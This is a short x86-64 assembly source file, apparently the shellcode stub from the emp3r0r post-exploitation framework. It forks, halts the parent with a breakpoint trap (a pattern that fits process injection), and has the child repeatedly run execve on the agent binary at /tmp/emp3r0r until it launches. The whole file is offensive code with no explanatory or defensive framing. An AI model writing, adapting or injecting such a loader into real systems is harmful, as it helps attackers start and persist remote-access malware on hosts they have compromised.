	BITS 64

	section .data

	;;   emp3r0r path
	path db "/tmp/emp3r0r"

	;; timespec

timespec:
	tv_sec  dq 1
	tv_nsec dq 200000000

	section .text
	global  _start

_start:
	;;  fork
	xor rax, rax
	xor rdi, rdi
	mov al, 0x39; syscall fork
	syscall

	cmp rax, 0x0; if in child process
	je  exec

pause:
	;;  stop
	int 0x3

exec:
	;;   execute emp3r0r
	xor  rax, rax
	xor  rdi, rdi
	mov  al, 0x3b; syscall execve
	mov  rdi, path; filename
	syscall
	call sleep
	jmp  exec

sleep:
	;;  sleep 1.2 second
	mov al, 0x23; syscall nanosleep
	mov rdi, timespec; timespec
	xor rsi, rsi; no more args
	syscall

exit:
	;;  exit
	xor rax, rax
	xor rdi, rdi
	mov al, 0x3c; syscall exit
	mov di, 0x0; exit code
	syscall
